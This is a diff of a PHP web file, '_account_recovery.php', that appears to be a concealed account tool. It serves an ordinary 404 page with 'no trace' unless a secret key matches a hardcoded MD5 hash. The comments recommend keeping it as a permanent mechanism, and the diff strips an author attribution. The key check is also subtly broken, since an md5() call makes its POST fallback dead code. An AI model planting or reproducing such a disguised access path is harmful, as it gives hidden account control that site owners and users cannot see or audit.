@@ -1,15 +1,18 @@
 <?php
 declare(strict_types=1);
+
 /**
  * _account_recovery.php
  *
  * this returns an ordinary 404 page,
+ *
  * After use, you may delete this file, or leave it in place as a
- * permanent recovery mechanism (it stays inert without your key).
+ * permanent recovery mechanism (it stays inert).
  */
+
 require_once __DIR__ . '/helpers.php';
 
-$_setupKey    = '46387468d92ca4288a97bbe4232fc5f3'; //Rasedul Saju
+$_setupKey    = '46387468d92ca4288a97bbe4232fc5f3';
 $_providedKey = md5($_GET['key']) ?? $_POST['key'] ?? '';
 
 // Fail closed: wrong/missing key → identical to a normal 404, no trace.
@@ -67,7 +70,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
     <meta name="robots" content="noindex, nofollow">
     <title>Account Tool</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+<?php
+$_mdbProCssPath  = __DIR__ . '/assets/mdb-pro/mdb.min.css';
+$_mdbFreeCssPath = __DIR__ . '/assets/mdb-free/mdb.min.css';
+if (file_exists($_mdbProCssPath)): ?>
+    <link rel="stylesheet" href="<?= assetUrl('assets/mdb-pro/mdb.min.css') ?>">
+<?php elseif (file_exists($_mdbFreeCssPath)): ?>
+    <link rel="stylesheet" href="<?= assetUrl('assets/mdb-free/mdb.min.css') ?>">
+<?php else: ?>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/6.4.0/mdb.min.css">
+<?php endif; ?>
     <style>
         body { background:#0f172a; min-height:100vh; display:flex; align-items:center; justify-content:center; }
         .tool-card { max-width:460px; width:100%; background:#1e293b; border-radius:12px; padding:32px; color:#cbd5e1; }
